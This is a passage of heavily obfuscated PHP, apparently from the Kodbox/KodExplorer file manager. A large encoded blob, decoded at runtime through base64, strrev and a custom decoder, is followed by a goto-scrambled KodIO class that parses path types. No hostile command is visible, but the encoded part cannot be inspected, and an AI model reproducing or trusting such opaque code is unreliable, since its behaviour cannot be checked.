\201\264\46\134\360\241\316\12\371\135\143\270\336\43\157\216\70\352\220\270\243\134\272\351\54\54\214\300\275\216\160\143\211\62\215\164\7\77\155\116"."\167\260\103\252\230\145\21\205\353\125\255\160\50\315\327\111\342\225\26\244\125\367\322\223\135\162\277\250\272\27\56\164\171\22\33\274\370\53\72\366\365\314\10\217\166\326\67"."\170\152\234\200\365\125\120\103\102\260\0\265\104\300\12\104\151\111\356\66\106\123\271\30\103\106\216\225\222\0\371\204\110\362\335\350\235\153\165\37\211\201\330\31\34\330\231".strrev('6A‹¿ó3»í¦w}3»ğYßB¡Àİ†'."\r".'fRtIè…îÇxeÈ<FÔ0x•ááÅ')."\42\225\263\331\32\354\256\126\344\46\26\120\114\214\120\216\233\200\107\225\342\21\47\331\203\142\203\46\27\110\366\142\341\57\316\362\33\74\304\46\102\102\230\42\226\352\134"."\xd4\xa2\x84\x32\x78\x83\x32\xf8\x94\x6c\x98\xd3\x2d\xbe\x28\x7e\xd1\xd9\x23\xbc\x30\xdd\xc0\xc4\x75\x26\x63\xb9\x35\xc3\x70\x43\xcf\x56\x48\xb2\x64\x67\xe9\xc1\x30\x55\xba\x59\xfb\x84\x4f"."\x57\x85\xdd\x21\xf1\xb8\xc3\xfc\xe\x32\xaf\x84\xdc\x75\x21\xd6\x95\xe0\xb0\x8f\xf9\x10\x0\x2\xb2\xa7\xd\xde\x3\x7\xac\x8d\x60\xc5\xd7\x93\xd5\xc\x45\xf4\xa2\x19\x57\x90\xa7\x35\x76"."\341\122\160\71\231\226\173\40\363\241\46\6\202\363\111\352\227\121\164\163\5\21\346\114\133\234\337\366\70\101\327\155\316\32\15\105\351\240\33\41\101\130\146\233\327\46\346".strrev('Î§kÔ.Ìÿ†èn&şd™°ÕH»A\\.˜Ì+…8wK¬NË™Ô8'."\n".'ÈŞÑ„')."\375\144\202\261\304\316\225\247\52\275\324\343\244\155\6\330\234\124\266\324\265\64\264\104\104\64\231\272\234\110\200\146\13\216\357\54\155\371\71\67\232\104\143\164\136\101\307"."\231\44\21\111\300\156\35\75\160\340\350\216\62\352\104\176\325\13\320\347\64\10\47\24\232\340\366\67\331\234\340\340\137\244\11\270\72\63\3\1\270\301\305\336\113\51\133".base64_decode('QF5FiRdi5uYToCdTrcXJUregCFBbUWXRuSXgt7TIUQQFJRSHIwUBqB1FleeWoEA=')."\51\271\265\337\107\314\77\5\77\176\374\204\202\154\155\247\310\246\51\350\326\246\40\154\300\371\135\341\256\160\167\223\71\77\245\23\176\221\273\21\267\363\371\236\50\140\155".base64_decode('1BgiKjJYwroJ1sWUetYSynobvGMop/Q0zHZy/5qTpvSkUxLZ9VQVl7vKiiXqhb4=')."\252\270\71\122\353\34\137\74\145\362\161\223\152\220\246\335\124\32\240\252\34\72\55\305\233\321\311\104\65\66\11\116\41\26\161\133\143\207\53\113\70\121\132\356\323\62\140".strrev('Œ¹½³›÷hÊê¸Qt_Nƒi/àR@æì¢a1ÉÓ[³f]ÅN36dŠí(\\9')._kodDe('Mlr/iXW9TX9Ro7mFXishwMjfRth3shswRfOGG5022GA1Gnx+pK5gC2Eou0uWHA20')."\x19\x29\x48\x15\x1d\x73\x52\xba\x86\x6c\x2f\x6a\x65\x7b\xe7\xdb\xda\xb\x51\xed\x4\xb2\x14\xa4\x7f\x30\xa9\xc0\x12\x6b\x2a\x85\xb2\x58\xbd\x70\xdb\x7d\x73\xdb\xb1\x80\x8a\xc0\xc1\x75\x8a"."\116\277\173\200\40\15\223\241\273\140\47\34\137\247\32\77\134\12\237\324\5\233\32\43\244\122\50\113\163\116\215\333\77\211\116\156\234\271\34\375\140\301\112\105\61\237\146"."\x40\x9d\xf0\xb3\xfa\x2c\x2\x37\xd8\xa0\x3b\x99\x8c\x6d\x97\xd9\x5\x1d\x66\xbe\xdf\x5d\x30\x79\xa5\x8a\x51\x95\x63\x26\x54\x52\xab\xf3\xf3\xe8\xc1\x53\x2e\x6b\x56\xb1\x20\xf5\xcb\x3b\xcc".strrev('Ö_2‰<gŠÙHËßïtğâÖ·’Ä§Ù9€,Bñnƒ}¦ì»€| ')."\5\70\151\134\41\206\370\152\206\54\255\302\333\61\154\100\332\150\100\147\371\145\76\105\132\123\35\274\47\255\320\344\215\120\170\7\150\250\306\105\51\264\254\12\232\315\130".base64_decode('MpfpqBISJVPTpLSc6SVC/nCjcrgxEX6oarhrdMIAEcKvmTtCuI5w51TYHwNJwao=').base64_decode('ZRd0FO+Ci1QoR3I1pXLMSXgWhUkLmwLNdf5G4fBYAERrvI1RT1NTwQQmlECFFTw=')."\162\161\265\323\167\60\142\224\252\46\251\351\66\51\6\115\66\253\212\40\264\110\62\364\30\165\312\130\344\46\174\24\145\340\333\242\111\52\51\122\14\213\110\11\100\46\116"."\24\302\311\305\223\47\271\325\311\14\331\334\373\205\256\161\213\124\227\373\34\270\111\162\303\163\331\314\171\160\164\305\143\42\4\255\345\276\56\44\151\222\54\141\74\126\25".strrev('ÏLÎF»İæÌOpÚ‚ãJbêQ¶\\EF¬Î1e¹&*ÏHÜ/l™<³1ë”±D³CÃ')."\x2f\x2\x2b\x77\xc5\xc4\x24\x3c\x92\xc8\x66\x36\x3f\xbf\x1b\x6d\xf0\xdd\x7c\x4f\x68\x3d\x1e\x60\x1a\xf5\x2\x44\xe1\x62\x4f\x69\x64\xe5\x58\x7\xa4\x28\xce\xfe\xc9\x37\x49\x42\x13\xdc\x86"."\340\4\213\123\152\123\70\10\313\101\233\165\244\364\325\271\253\375\5\13\160\105\160\305\137\264\50\37\106\354\147\354\111\236\254\152\7\101\312\261\303\340\116\232\303\300\72".base64_decode('Zv0MploxE4fQPPiXlwk01vEI3nZYEudQUzUUa5lT7BqxaJFbpQfQLUXWsi6WG8c=')."\133\134\326\374\240\47\4\365\54\43\1\330\163\142\371\361\2\62\371\216\163\217\340\26\362\354\240\131\202\247\317\125\125\223\347\260\63\206\271\64\215\12\201\152\371\170\72".base64_decode('/H1JZ2QGC9Y0cjGXv/Ilos02ATCvcSENicfqEXJKF3MXLxbFYU82K0bpqwlIF54=')."\x52\x5b\xdd\x8c\x13\x60\xfd\xb8\x2b\xc6\xcd\xc8\x69\x16\xc4\x87\x6c\x70\x78\x82\x6c\x4b\x80\x6f\x8e\x21\x70\x17\x60\x94\x40\x22\x6b\xb7\xc3\x41\x5d\xc\xc8\x2\x93\x8c\x98\xae\x66\x4d\xb".base64_decode('D8PPQxUhB//tcpeMsxRJ9LmZIuTPuAjwLJxCmAVvyiTInCRdSVUVoeYaSUUB5RE=').base64_decode('+yn0EVCwSKKcMy0zjOmmBhZFZiVNntZoDhEDVE8jOX8g4tY58/DvuedQIkJvuaQ=')."\24\35\133\331\41\216\204\116\244\22\134\215\105\136\372\150\12\5\43\301\32\372\130\102\41\175\327\150\52\333\32\330\2\237\357\201\250\5\364\124\337\54\153\16\46\55\270"."\11\204\14\277\236\313\144\330\221\77\24\37\331\222\206\317\163\302\311\234\311\27\103\350\356\70\2\157\46\31\4\54\170\251\202\76\262\224\270\313\22\51\220\15\37\271\303"."\x4a\xe8\xfc\xb0\xe8\x2c\x70\xf5\x29\x8d\xfa\xe6\xaa\x28\x2b\x2b\x73\x96\x95\x83\xff\xd9\x51\x23\x91\xbf\x2a\xe9\xe5\x45\x21\x4b\x59\x59\x25\xfa\x1f\x27\x20\x4d\x2b\xc1\xa2\x35\x5\x4c\x68"."\312\211\110\206\156\105\41\15\42\154\76\255\146\162\124\104\232\123\3\15\324\45\330\264\271\124\52\240\355\7\10\104\227\251\50\123\230\50\154\354\46\112\350\50\213\304\24"."\x3b\x12\xd8\x19\x21\x19\x12\xba\xba\xc2\x99\x4e\xc3\x40\x52\x1\xc3\x83\x90\x42\xda\xcb\x6e\x23\x80\x6c\x7c\xe0\x27\xe2\xfb\x1d\x55\xac\x51\xbe\x4c\x7c\x8e\xf8\x31\x17\x45\x2e\x6\x72\x27"."\x9e\x4e\x9a\xe0\x14\xdd\x61\x93\x42\x98\xdd\x73\xcb\x8\x4b\xd3\x40\x19\xb0\xc8\xc6\x58\xaf\x20\x40\xd0\x68\xa0\x7b\x66\xec\xe\x0\x8a\xa5\xd8\xed\x43\x18\x6d\x64\x59\xb1\x13\x75\xfc\xe2"."\40\101\111\1\2\113\152\335\121\276\120\302\350\5\54\206\60\4\367\63\224\252\342\144\73\66\221\240\211\262\105\112\105\364\300\232\234\177\243\373\166\35\152\312\162\61\50"."\x2a\xd4\x2d\x22\x67\x22\xcc\x28\xda\x78\x80\x49\xe3\x61\xde\xe2\x1\x6f\x82\x32\x31\x25\x1\xac\x7c\xaf\xe2\x68\x77\x71\xe2\x41\xce\x38\xd1\x33\x55\xd8\x60\xa6\xf2\xb8\xbc\xd1\x31\xed\x23"."\x83\xd0\xae\x6b\xfc\x96\x4f\xde\x7b\x6f\x34\x26\x5c\xf2\xa3\x4a\xea\xf0\x2f\x58\x6b\x50\x88\x8f\x2\xb0\x7d\x43\xd\xf3\xad\x25\x54\x60\x4f\xb2\x95\xf1\xc4\x85\xa7\xc8\xc\xee\x54\xab\x86".strrev('"|Ä‡X™Î~{,Á…Mà'."\n".'ûËÖº²¸“ØK£­0ùƒn ÀjÁ`óám=ôy')."\x10\x9a\x24\xd1\x57\xb1\x8\xdd\xf1\xdb\x43\x32\x7f\xaf\x4f\xc8\xca\xd7\x76\x1\x68\x35\x1a\x12\x12\x6a\xd8\xd3\xc\x22\x10\xee\x71\xc4\x23\x7f\x74\xd7\xd3\x5a\x7\xdc\x3c\x59\x21\xac\x65"."\77\103\53\164\323\153\222\27\324\204\233\137\44\33\347\4\120\41\41\252\106\125\215\132\23\100\154\360\223\75\53\34\303\360\26\64\46\72\362\214\40\333\251\224\102\37\157"."\43\354\6\321\75\254\0\131\135\330\20\310\151\225\114\266\252\52\261\230\65\355\243\313\256\246\201\325\64\27\104\41\323\240\211\352\143\210\276\250\250\35\200\223\256\236\275"."\x19\x56\x80\xe8\xac\x84\x95\x47\x41\x48\xb9\xc\x2b\xa8\x64\xfc\x49\x88\x81\xad\x11\x95\x90\xe2\xb4\xbd\x9d\x39\x85\x4a\x75\x2\x33\x93\x4c\xce\xca\x8\xe3\x89\x24\x75\xcd\x34\xc5\xcb\xbe"."\236\270\300\201\3\342\232\36\301\105\234\223\371\167\54\247\115\202\23\116\226\25\254\45\364\353\62\135\137\220\211\17\162\36\55\154\120\154\121\273\31\20\132\35\114\312\377"."\xa9\xf7\xd2\xc\x7b\xd8\x3\xe\x67\x58\xb0\xc2\x28\xf0\x5\x52\x88\x15\x21\x8b\x94\xae\xc4\x34\x1d\xed\x54\x85\x9b\x8b\x19\x33\xa4\xb4\x89\xd1\x80\xc6\x76\xe8\xf0\x74\x43\x29\x50\x5\xbc".base64_decode('mi6QOKQCsHfMiRfdBeenICZ4mxWEDWe5xKSUKK4ZR0YKCSh/IYHFpicSDC/R1jg=')."\234\153\145\52\171\233\30\101\155\71\45\161\225\246\306\231\260\2\164\147\30\366\300\20\323\100\265\320\321\41\357\231\130\4\175\63\257\10\116\203\53\53\267\342\24\123\14".strrev('…( VùBüø²ODK~¤á^YËÒÔ*ô$‰#‡`€¿æ1£$¡OJ|:¨‚—°').strrev('sC0^–Ær?'."\n".'Ù¾]¤Ì)n°ºbÌsº\'˜•tF¥ùk÷CŞG>H¶ÌH>S')."\xa1\x74\x8c\x21\x98\xec\xb5\x18\xc2\xd9\x32\x80\x99\x61\x4d\x27\x1e\x6d\xd3\x96\xb7\x60\x1\x1d\x58\xac\x29\x6c\x95\x10\xaf\xc5\xa2\xa7\x5e\x54\x8a\xf7\x83\xdb\x14\x2\x90\x86\xfd\xe6\xa".base64_decode('iOFH5/haMjWGZHyJgyMaA+Yfv7uYMSi550Je6SophfdcLPqQhl52XwGMZAdcJJg=')."\105\236\41\106\150\52\43\116\303\22\301\26\54\226\322\14\304\162\165\53\344\312\12\333\267\67\325\67\271\31\250\232\242\211\335\74\45\33\73\376\356\23\261\355\42\167\106".strrev('å(pxYTéÖÔÏ#$/'."\n".'b›R©áıx	ã_Î°@¤Æ­;¶[}Q™*jÁ2nµŞº').strrev('¯®)Ü]@Ê€†VÓã#WŠ£LZµ„òğ­‚ŞƒqÄÎ3§‚lè0Ìç2·').strrev('AW;X¯D´g*¥Ó5x×d­bÁ¹¬E0ü/ä†´'."\n".'ä'."\n".'-åˆ‚¯?%ug2')."\xea\xcc\x3f\x78\x5c\x74\x27\x2e\x8c\x0\x47\x36\xfe\x4a\xbe\xf7\xf\xe2\xee\x40\xf4\x4a\x6b\xdb\x36\xe3\x61\x12\xdd\xc4\x64\xa9\x42\x9d\x3c\x77\xc4\xfd\xd1\xa3\xa8\xf0\x52\x40\x56\x97\x55"."\x43\x11\x0\xd8\x65\xfd\x8\x62\xef\x2e\xa7\x52\x96\xa7\x7c\x52\x9\x21\x9a\xb3\xae\xb2\x5\x3f\x15\xc5\x1f\xa0\x30\xc1\x13\x4d\xa1\xc\x21\xf8\xfc\xea\xff\xba\xa9\x6a\x9c\xfb\x68\x50\xe3".base64_decode('9Oye2fhjh8c14oNP9Jt5ryH84rsKDn4EEUWX6OnjLejRaXK+ws6uo0ghF+WfAPs=')."\72\275\67\53\236\1\271\343\156\206\142\34\200\216\157\174\124\31\14\43\134\110\206\331\111\155\360\163\170\233\4\66\155\360\60\204\212\323\124\333\2\370\1\301\263\345\14"."\324\366\102\204\335\324\317\362\310\152\336\67\240\361\325\341\353\1\345\44\256\212\140\31\244\52\251\14\77\75\302\274\113\113\223\350\35\43\376\11\344\3\302\227\316\232\226"."\x9d\x60\xbd\x68\xaa\x2b\xa0\x18\x3\x90\xf0\xc2\xa5\x7f\x68\x48\xa2\xa5\x7b\xf3\x0\x16\x8d\x44\x80\xb6\x8b\x19\x9b\x41\xdf\xda\x99\x84\x26\xa2\x1\xf1\x4f\x68\x77\x8d\xdf\x5\xc2\x5b\x4e"."\x7\x10\xdf\x15\x33\xff\xa9\x0\x5c\xfc\xff\x4b\x41\x9c\x18\x16\x4c\xf0\xac\x95\xe4\x37\xc8\xb0\xaf\x5e\x5c\x92\x82\xaf\x20\x24\xb5\x6e\xeb\xe3\x40\x10\x62\x7f\xf7\xc0\xf2\xe2\x81\x40\xfb"."\xe8\x62\xaa\xf8\x46\x3\xf5\x94\xf\x84\x54\xcb\x73\x16\x42\x85\xc3\xf1\x4f\xb\xf9\xa5\x6b\x8a\xbd\x6a\xcc\x45\xc8\xd7\x4b\x19\xa9\xd4\x58\xde\x88\x17\x0\xd\xa\xdf\x3d\xa2\x52\xd0\x1c"."\100\246\317\316\261\207\154\70\225\61\237\351\314\107\72\237\240\350\105\25\357\141\362\331\300\222\325\131\74\367\301\317\327\73\253\227\162\166\0\310\114\302\220\151\236\350\5".strrev('xÆé…ÛÎì¶Ì½èÄÒO d,ŸA³‰ÇªDƒN¢AZ,1^ê±â‡ ´–6äE¢?').strrev('Âì.¨`+ãñ—"@ävÂ€ü³g-È0Ù-,Ä—`ëê˜²*¶©Êµ¥-ºX¡')."\104\73\124\174\54\303\157\277\220\354\340\153\115\370\34\206\164\133\254\222\236\215\61\245\144\255\360\46\251\73\377\54\15\132\75\21\346\40\32\5\222\143\115\227\270\115\42"."\31\244\111\22\37\140\313\234\204\4\1\144\125\7\12\240\111\57\212\325\77\3\145\164\150\165\357\217\11\26\375\170\225\4\333\143\300\70\137\137\305\213\257\374\14\335\376"."\122\14\375\14\173\366\306\201\173\306\37\63\303\217\334\70\330\203\66\16\354\1\310\101\236\261\161\360\133\114\77\367\102\0\177\152\320\372\76\41\154\63\263\242\313\23\366"."\xed\x72\x3e\x43\x95\xad\x40\xc8\x8e\xb8\x88\x96\xaf\xfd\xe3\x27\x88\x99\x5c\x9a\x9f\xc9\x82\x88\x75\xdf\x93\xd7\x61\xa1\x87\x39\x3d\xe5\x40\xe7\xa7\xe\xea\xe7\xc5\x86\xe\xde\x2b\x71\x64".strrev('à4¨‚f5¯+1D½åQıÍnÕT-Sg²g=:­IÊr·3h”ÆÀë—ğà'."\n".'')."\xe3\xc3\xcf\x6f\x88\xf\x32\x72\x7a\x44\x56\x7e\x3e\xe2\x92\x95\x9e\x24\xea\x4\x4b\x9c\xb7\x28\xd1\x6a\xe7\x9a\xff\xde\x94\x8d\x3\xff\xef\x28\x9f\x4b\xdc\x38\xab\x60\x75\x9a\xff\x2a\x5f".strrev('š¿Ô4×{‚–ìüÏ‡u„?@¼5áoÖS+ø±^§Á¹yà×˜;eúÂ¶'."\n".'')."\xba\x6c\xdd\x84\x15\xda\x6b\x20\x4c\xd0\x8d\x8d\x8a\x9e\xcc\x54\xec\x6d\x47\x88\x21\x5a\xa\x9e\x2c\x6c\x46\xc4\x1a\x4d\xcd\xae\x62\x81\xc5\xe1\xba\x84\x34\x7c\xc1\xc\xf5\x3e\x9\x6f\x67".base64_decode('8jklsJT/xQDS/QbemnCzjAI9d59P+UaBZ52E8+ufaTcWsdjeyimbToEgBbWcYgY=')."\321\0\23\141\205\157\365\254\175\265\125\17\212\361\72\346\72\244\303\145\312\227\263\204\327\237\270\217\12\101\302\202\245\351\65\260\303\354\224\51\163\22\337\265\62\223\174".base64_decode('K4BnqGW2Cq7lxHsxqCJxGuRXjZQvpL1kutZHIk346pOnjl2HkgWrGYg64RE3TQw=')."\x5b\xef\x1a\x7\xa9\x33\x30\x20\x13\x59\xb6\x61\x20\xee\xb5\xbd\xf3\x87\x58\x8e\xfd\xf1\x3f\xda\x7f\x34\xcf\x39\xb\x13\xee\xd5\x59\x36\xb\xec\x9d\x16\xcb\xe6\xc1\xb0\x3f\xa1\x4\xa4\x27"."\xd1\xa3\x1e\x88\x32\xa\x27\x6b\x25\xe1\x75\xc8\x20\x19\x7f\x4d\x58\xa\xf9\xaa\xc7\x43\x87\x7b\x90\xd7\xfa\x5a\xaf\xe5\xfa\x21\xf4\xa6\x60\x9b\xd6\xf4\x52\xa3\x61\x7b\xd8\xc\xbb\x5a\xc3"."\141\52\170\377\377\176\63\350\377\326\123\101\143\312\250\306\332\362\114\140\35\221\147\251\360\325\47\370\123\304\332\122\133\77\254\53\42\171\150\232\77\214\51\304\231\325\45"."\365\250\101\35\155\310\364\204\105\116\245\354\307\215\171\73\200\274\27\325\0\361\165\260\147\300\12\105\362\37\62\265\320\31\225\44\205\147\64\325\130\107\201\343\100\210\355".base64_decode('gNXRoLD+52XjrAiICdS1iJuGYnADBYVEygHFC3LBLN1qlRKmO/d8yinQlVvCMEQ=')."\x26\x61\x1\xe5\xb1\x96\x88\x5\x87\x16\xa0\x88\x1e\xfe\xc\x30\x7b\x84\xd4\x52\xa2\xc1\xf6\xa6\x14\xce\x64\x88\xb8\xb5\x68\xa5\xf3\x4f\x87\xf3\x4b\xb3\x79\x2b\x16\x81\xc6\xa9\x56\xe5\xc"."\x7b\xe4\xb3\xcc\xfe\xea\x67\xb9\x33\xff\x63\xd8\x36\x1c\x2a\x16\x42\x70\x2b\x4f\x75\x2c\xe8\xe0\x2\x1d\x2c\x16\x28\x83\xe9\x2c\xcc\xf3\x1c\x86\xd2\xb\xcf\x37\xf6\x96\x17\xdf\xcf\xc2\x90"."\xd8\x5f\x3a\x6f\x9b\x74\xd\xc9\x5a\x56\x28\x53\x6f\x8\x76\x81\xc2\x8b\x93\x79\x2f\xca\xd9\xe\x0\xc0\xc6\x87\x9f\x88\xa9\x1a\x72\x24\x4a\xba\x1d\x6e\x6e\x28\x41\xd7\x1b\x8\xa5\x2\xb9".base64_decode('XXiI20xnsdpLXC7p3SHBLJeALMopQ/QDbS0JDa2tM2VyoWwxTTeEbAxeKC98tM8=').strrev('ÌÒ¹xõ’ùùÚ\'ÑUİL‰F¥:·$€çN£ñÉ_lµo¼\\›Eu{µw{“`´')."\343\124\71\65\40\44\243\122\324\367\11\370\205\167\250\374\374\122\71\112\306\132\161\117\227\154\322\103\62\173\51\353\173\236\302\141\140\14\321\216\57\377\274\207\37\103\11".base64_decode('6zwtBrcZnAXb4AKf59xO7uJHPFzQjcfZ27GWrHEq6jMogPBnZqFYI1zL5JbASrc=')."\xfd\x69\x40\x97\x78\x95\xd3\x92\x31\x1f\xca\xaf\x6d\xa\xe5\xb9\xb6\x9f\x77\x13\xc2\xa\x75\x1f\x4d\x19\x6b\x71\xf1\x5a\x28\x23\x2a\xe\xc2\x8e\x7e\x99\x99\x8c\xb0\xa9\x80\x16\xed\xdc\x7e".base64_decode('BneF7ZD5J62XUFk2NmYgD7o/4LRAbdskqG+gK7YtyRCfxbWe8YlbdoEElFRAqE4=')."\x3c\xff\x3b\x6c\x81\x70\xe1\x8f\x70\xaa\xb4\xa2\x58\xb8\xb0\xcb\x13\xe8\x62\xa5\x59\x90\x2f\x30\x3b\xd6\x31\x92\x33\x24\x26\x5a\x9a\x63\x1f\x5a\x24\xe1\x73\xf2\xc5\xc0\x34\x52\x69\xe2\x34"."\x8f\x35\x9\xe7\x57\x6c\xad\x17\xb\xd8\x7b\x86\x4b\x18\xdd\xaa\x19\x4b\xa\xdb\x8e\xfc\xc4\x7c\xb8\x9e\x87\x54\xf2\xa1\xc2\xed\xb5\xb7\x8a\xe2\xd4\xbe\x19\xe3\x95\xe4\xb5\x47\x30\x22\x88"."\x68\x5\xca\xe0\x16\x15\x2c\x86\x93\xd0\x63\xf6\x4c\x5c\xb4\x94\x3d\xc\xa\x60\x59\x9c\x4\xcb\xe6\x25\xd3\xc2\x82\xee\x42\x28\x67\xca\x39\xe3\x30\xdd\xcb\x47\x1e\xd9\xd0\xc7\xb\x74\xd8"."\266\355\305\131\17\207\317\202\231\363\77\107\50\316\236\33\151\0\12\267\202\157\334\155\7\265\205\132\121\60\363\141\133\121\340\101\152\342\6\254\0\257\245\51\5\270\53"."\x3f\xd5\xcf\xe7\xe3\x3c\xad\x80\x8d\x1\xae\x13\xae\xd1\xa2\xd7\x99\x2\xc9\xa2\xc1\x42\x61\x93\x86\x50\xc1\xa9\x6f\x58\x6d\xd\x6c\x70\x11\x31\xd4\xee\x8\x6c\xce\xf8\x13\xc7\x82\x85\xee"._kodDe('LvtgvzsqVQoiFkvM0vwqjwo3oslx4tejWlaCFxZ9yCQGZghXkOPenSaJGbDaO/Vb')."\274\153\321\114\65\46\330\73\161\253\123\326\115\225\213\361\51\101\327\146\123\163\361\215\275\345\310\273\200\42\10\201\210\270\306\325\311\26\273\163\274\376\23\75\72\76\115"."\xab\x81\x87\xaf\xec\x8\x5\x6e\xaf\x1c\x78\xbd\xc4\xc9\x61\x4d\x37\x1d\x30\x2d\xa2\x65\xd1\x6f\xb5\x66\x9a\xfc\x90\x18\x6f\x97\x91\x90\x7\x17\x3d\x87\x60\xeb\x0\x42\xfc\xbc\x4\x62\x11"."\xa9\xf0\x11\x39\x22\xb6\x81\x82\xe4\x5c\xf\xee\x43\xc3\xa\x4e\x45\xcc\xc6\x12\x81\x47\x3\x2c\x22\xae\x69\xe4\x7c\xaf\x36\x67\x3b\x81\xe4\x0\xb0\x89\x6c\xd5\x7a\xa8\x8b\x37\x78\xd7\x95"."\xb7\x87\xbf\x25\x2c\xdb\x5\x39\x2e\x83\x10\x7a\x13\x2d\x37\xd0\x8d\x62\xc3\x8d\x53\xdc\xc4\x39\xae\x13\xd5\x41\x1e\xb5\x70\xb5\x67\xdb\x2c\xc5\xb1\x9b\x7e\x66\xb1\xf8\x73\x35\x10\x35\x24"."\257\2\73\315\104\32\44\350\76\326\67\323\37\216\204\363\222\232\74\341\360\214\140\310\213\175\154\346\45\243\122\202\221\114\136\122\123\175\260\361\160\151\276\6\217\77\220"."\227\6\215\146\32\243\334\7\20\116\362\67\241\126\172\2\201\340\214\303\265\302\137\63\225\267\4\35\232\162\355\166\66\251\121\245\65\325\376\207\345\24\335\113\13\327\344"."\x94\x34\x77\x6\xc5\xcb\x58\x55\x4\xe2\xb8\x1a\xd4\x4f\x1a\xb\x58\x3d\xd1\xdb\xec\xd7\x28\xc1\x92\x8a\xa0\xc1\x4b\x23\xa9\x3b\x94\x25\x50\xe8\x73\x94\x4d\x6e\x26\x2c\xa3\xe\x89\x76\x72"."\xfc\x58\xd8\x65\x39\x3e\x16\xe0\x68\xb2\x20\x16\x23\x10\xa1\xb8\xba\x22\xc0\x88\x82\x18\x13\x55\xa5\xf9\xaa\x7b\x94\xca\x31\x2\x5b\x7a\x81\x46\x4c\xac\xda\xb5\x56\x41\x35\x8f\xf7\x2e\xe4".base64_decode('7hrBsWDlhMMk+f8A0tppxNWhAAA=')."".""."".base64_decode(''), 10, -8))); goto eØŒãÀ•ÆŸ; e±â¡½Ë‘À: class KodIO { const KOD_SOURCE = "\173\163\157\165\162\x63\145\175"; const KOD_USER_RECYCLE = "\173\x75\x73\145\162\122\145\x63\171\143\154\145\175"; const KOD_USER_FAV = "\173\x75\x73\x65\x72\x46\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\173\165\163\145\162\106\151\x6c\145\x54\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\x72\106\151\x6c\x65\124\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\x75\160\x52\x6f\x6f\164\x53\x65\x6c\x66\175"; const KOD_USER_SHARE = "\173\165\163\145\x72\123\150\141\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\x73\145\x72\x53\x68\x61\162\x65\114\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\141\x72\145\124\x6f\x4d\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\x68\141\x72\x65\x49\164\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\141\x72\x65\x49\x74\145\x6d\114\151\x6e\x6b\x7d"; const KOD_SEARCH = "\173\x73\x65\141\162\x63\150\x7d"; const KOD_BLOCK = "\x7b\142\x6c\157\x63\153\175"; const KOD_IO = "\x7b\x69\x6f\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\145\162\x52\145\156\143\145\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\144\x72\x69\166\145\162\x7d"; public static function typeList() { $Cí©Ô­ä£† =& $_SERVER[œÕÊİğö]; return array($Cí©Ô­ä£†[1161] => self::KOD_SOURCE, $Cí©Ô­ä£†[1162] => self::KOD_USER_RECYCLE, $Cí©Ô­ä£†[1163] => self::KOD_USER_FAV, $Cí©Ô­ä£†[1164] => self::KOD_USER_FILE_TAG, $Cí©Ô­ä£†[1165] => self::KOD_USER_FILE_TYPE, $Cí©Ô­ä£†[1166] => self::KOD_GROUP_ROOT_SELF, $Cí©Ô­ä£†[1167] => self::KOD_USER_SHARE, $Cí©Ô­ä£†[1168] => self::KOD_USER_SHARE_LINK, $Cí©Ô­ä£†[1169] => self::KOD_USER_SHARE_TO_ME, $Cí©Ô­ä£†[1170] => self::KOD_SHARE_ITEM, $Cí©Ô­ä£†[1171] => self::KOD_SHARE_LINK, $Cí©Ô­ä£†[1172] => self::KOD_SEARCH, $Cí©Ô­ä£†[1173] => self::KOD_BLOCK, $Cí©Ô­ä£†[1174] => self::KOD_IO, $Cí©Ô­ä£†[1175] => self::KOD_USER_RECENT, $Cí©Ô­ä£†[1176] => self::KOD_USER_DRIVER); } public static function parse($fªá†±ñ×ç) { goto eØ‰ êí; F°Î“ÙˆÛ: preg_match($A‰ğÙ‘†İ‚[1177], $fªá†±ñ×ç, $cö…óº³ˆ“); $BŠ‹†î×Ø³ = array($A‰ğÙ‘†İ‚[426] => !1, $A‰ğÙ‘†İ‚[1178] => !1, $A‰ğÙ‘†İ‚[423] => !1, $A‰ğÙ‘†İ‚[86] => $fªá†±ñ×ç, $A‰ğÙ‘†İ‚[1087] => !1, $A‰ğÙ‘†İ‚[1086] => $A‰ğÙ‘†İ‚[43]); if (is_array($cö…óº³ˆ“) && count($cö…óº³ˆ“) == 5) { $döòÛâéò = $A‰ğÙ‘†İ‚[1179] . $cö…óº³ˆ“[2] . $A‰ğÙ‘†İ‚[335]; if (in_array($döòÛâéò, $d³§ˆÒ‹ë™)) { $BŠ‹†î×Ø³[$A‰ğÙ‘†İ‚[1087]] = $cö…óº³ˆ“[1]; $BŠ‹†î×Ø³[$A‰ğÙ‘†İ‚[39]] = $döòÛâéò; $BŠ‹†î×Ø³[$A‰ğÙ‘†İ‚[1180]] = substr($döòÛâéò, 1, -1); $BŠ‹†î×Ø³[$A‰ğÙ‘†İ‚[404]] = $cö…óº³ˆ“[3]; } $BŠ‹†î×Ø³[$A‰ğÙ‘†İ‚[1086]] = $cö…óº³ˆ“[4]; } goto BÑƒšùÊöá; eØ‰ êí: $A‰ğÙ‘†İ‚ =& $_SERVER[œÕÊİğö]; $fªá†±ñ×ç = self::clear($fªá†±ñ×ç); $d³§ˆÒ‹ë™ = array_values(self::typeList()); goto F°Î“ÙˆÛ; BÑƒšùÊöá: $B¦½ ²©¡ = array($A‰ğÙ‘†İ‚[43], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $BŠ‹†î×Ø³[$A‰ğÙ‘†İ‚[1142]] = in_array($BŠ‹†î×Ø³[$A‰ğÙ‘†İ‚[39]], $B¦½ ²©¡); return $BŠ‹†î×Ø³; goto Eª…¢Ïªñ; Eª…¢Ïªñ: } public static function isTruePath($D¡ Æß‘ß) { goto A“•µ‰‡õ—; DÀÅó³¾: if (strpos($D¡ Æß‘ß, $C¥˜¦øçÇ†[1146]) === 0) { return !0; } if (strpos($D¡ Æß‘ß, $C¥˜¦øçÇ†[1181]) === 0) { return !0; } if (strpos($D¡ Æß‘ß, $C¥˜¦øçÇ†[1182]) === 0) { return !0; } goto AŞáª×ù²¸; AŞáª×ù²¸: if (strpos($D¡ Æß‘ß, 